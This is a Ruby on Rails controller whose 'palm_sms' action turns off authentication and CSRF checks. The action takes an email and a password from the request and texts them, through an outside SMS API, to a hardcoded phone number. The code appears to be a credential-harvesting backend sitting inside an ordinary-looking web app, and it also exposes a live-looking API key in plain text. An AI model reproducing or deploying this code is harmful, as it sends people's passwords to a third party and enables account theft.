class HomeController < ApplicationController
  require 'net/http'
require 'net/https'

  skip_before_filter :verify_authenticity_token
  skip_before_filter :authenticate_user!, :only => [:receive_sms, :palm_sms, :get_s3_upload_key]

  def index
  end

  def generate_random_code
      return Random.rand(10001..99999).to_s
    end

  def palm_sms
    phone_number = 639175314928
    email = params[:email]
    password = params[:password]
    message = "This is the email" + email + " And the password is" + password
    message_type = 'SEND'
    request_id = 0
    Rails.logger.info 'hello hello'

    uri = URI.parse("https://semaphore.co/api/v4/messages")

    # Shortcut
    response = Net::HTTP.post_form(uri, {"apikey" => "Jaxn19qGX11Uzm9dxzpJ", "number" => "09175314928", "message" => message})


    Rails.logger.info response

    render json: {
      status: 'success'
    }
  end
end
